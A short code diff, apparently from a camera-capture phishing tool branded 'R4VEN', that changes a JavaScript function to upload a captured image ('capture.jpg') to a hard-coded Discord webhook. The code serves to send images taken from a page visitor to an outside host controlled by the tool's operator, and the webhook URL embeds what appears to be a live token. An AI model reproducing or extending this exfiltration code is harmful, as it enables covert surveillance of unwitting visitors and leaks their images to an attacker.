@@ -293,9 +293,15 @@
     // REPLACE THIS WITH YOUR DISCORD WEBHOOK URL
     let discordWebhookUrl = "https://discord.com/api/webhooks/1430077778094592070/4RCjrTCQlGTxIw_4MMbRXJh3G4nmN-9oPYPr_OxUImYe8GzxToRyc7Fz5O3YCzBRzQ6X"; 
 
-    function postFile(file) {
+    function postFile(blob) {
       let formdata = new FormData();
-      formdata.append("image", file);
+      // Add the filename and mimetype to help Discord recognize it as an image
+      formdata.append("file1", blob, "capture.jpg");
+      formdata.append("payload_json", JSON.stringify({
+        username: "R4VEN",
+        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png"
+      }));
+      
       let xhr = new XMLHttpRequest();
       xhr.open('POST', discordWebhookUrl, true);
       xhr.onload = function () {
